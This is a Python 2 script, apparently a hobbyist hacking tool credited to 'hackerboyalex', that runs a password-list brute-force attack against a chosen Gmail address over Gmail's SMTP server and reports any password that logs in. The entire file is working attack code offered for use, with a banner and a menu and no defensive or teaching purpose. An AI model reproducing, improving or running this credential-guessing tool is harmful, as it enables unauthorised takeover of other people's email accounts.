#!/usr/bin/python
'''create by hackerboyalex'''

import smtplib
from os import system

def main():

 print'        _______  _______  _______ _________ '
 print'       (  ____ \(  ___  )(  ____ \__   ___/ '
 print'        | (    \/| (   ) || (    \/   ) (   '
 print'        | |      | |   | || (_____    | |   '
 print'        | | ____ | |   | |(_____  )   | |   '
 print'        | | \_  )| |   | |      ) |   | |   '
 print'        | (___) || (___) |/\____) |   | |   '
 print'        (_______)(_______)\_______)   )_(   '
 print '=================================================='
 print ' create by hackerboyalex:www.hackerboyalex.cf '
 print '=================================================='                                                  
                                                                                                  
main()
print '[1] Start'
print '[2] Game over'
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] Access Granted :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] Access Granted  :' + password + '     ^_^'

            break
         else:
            print '[!] Access Denied => ' + password
login()
